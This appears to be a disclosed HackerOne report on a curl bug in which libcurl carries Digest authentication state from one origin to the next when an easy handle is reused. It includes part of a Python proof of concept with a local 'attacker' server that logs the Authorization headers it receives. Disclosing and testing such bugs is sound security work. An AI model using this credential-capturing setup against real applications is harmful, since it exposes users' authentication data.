# [M] CVE-2026-11856: cross-origin Digest auth state leak

## Summary
Severity: Medium
Program: curl
Weakness: Information Exposure Through Sent Data
Reporter: jjchuck
State: resolved
Disclosed: 2026-06-24T06:21:56.814Z
CVE: CVE-2026-11856
Source: https://hackerone.com/reports/3793260

## Details
## Summary:
This issue is the HTTP sibling to the previously disclosed RTSP Digest auth leak. When an application uses libcurl and reuses the same easy handle for sequential transfers (the documented best practice), the Digest authentication state captured from the first origin is silently sent to the next origin. This occurs because `Curl_pretransfer()` drops the `initial_origin` but fails to clear `data->state.digest` between `curl_easy_perform()` calls. Unlike recently fixed sibling bugs, this leak does not require redirects (`-L`), `.netrc`, proxies, or OAuth bearers. Furthermore, explicitly changing credentials via `CURLOPT_USERPWD` between calls does not prevent the leak, as the new user's password hash is still sent under the previous server's realm and nonce.

## Affected version
Reproduced on stock curl 8.7.1 and current master 8.21.0-DEV (`81cdf4d`), macOS arm64. Backend (SecureTransport/OpenSSL) is irrelevant.
Please note that the curl command-line tool is not affected — it calls `curl_easy_reset()` between transfers. This bug is in libcurl as used by applications that reuse easy handles. As of master 81cdf4d, no open PR or issue addresses this; the closest fixes (`6daf4bc7e2` redirect; `c1cfdf59ac` proxy) only cover their respective trigger paths.

## Steps To Reproduce:
The PoC sets up a legitimate server (`:19001`) that challenges the client, and an attacker server (`:19002`) that does nothing but log received headers.

1. Servers (`digest_servers.py`)
```python
#!/usr/bin/env python3
import http.server, threading, sys

class Legitimate(http.server.BaseHTTPRequestHandler):
    challenge = ('Digest realm="legit-api@example.com",'
                 ' nonce="LEGIT-NONCE-7c3f0e1d", opaque="LEGIT-OPAQUE",'
                 ' qop="auth", algorithm=MD5')
    def do_GET(self):
        auth = self.headers.get('Authorization')
        if not auth:
            self.send_response(401)
            self.send_header('WWW-Authenticate', self.challenge)
            self.send_header('Content-Length', '0'); self.end_headers(); return
        sys.stdout.write(f"[LEGITIMATE:19001] {self.path}\n    auth={auth}\n"); sys.stdout.flush()
        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()
    def log_message(self, *a, **k): pass

class Attacker(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization', '<<NO AUTH>>')
        sys.stdout.write(f"[ATTACKER:19002]   {self.path}\n    auth={auth}\n"); sys.stdout.flush()
        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()
    def log_message(self, *a, **k): pass

def run(p, c): http.server.HTTPServer(('127.0.0.1', p), c).serve_forever()

```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/3793260_
